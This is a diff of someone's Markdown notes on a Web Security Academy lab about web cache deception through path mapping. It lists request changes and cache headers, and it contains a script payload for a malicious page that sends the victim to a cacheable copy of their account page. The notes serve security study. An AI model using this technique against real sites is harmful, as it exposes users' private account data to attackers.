@@ -12,14 +12,14 @@
 	- Cache-Control header
  
 ## Exploiting path mapping
- Lab : https://0a86005804fbe54880ed3f7400d6000d.web-security-academy.net/\
- Burp Repeater\
+ Lab : https://0a86005804fbe54880ed3f7400d6000d.web-security-academy.net/ <br>
+ Burp Repeater  <br>
 Request:
 - change /my-account/ to /my-account/abc.js
 - add X-Cache: miss 
 - add Cache-Control: max-age=30 
 Response:
-- X-Cache chnage to hit -- > X-Cache: hit\
+- X-Cache chnage to hit -- > X-Cache: hit  <br>
 
 Create 惡意 website (html)
 - <script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
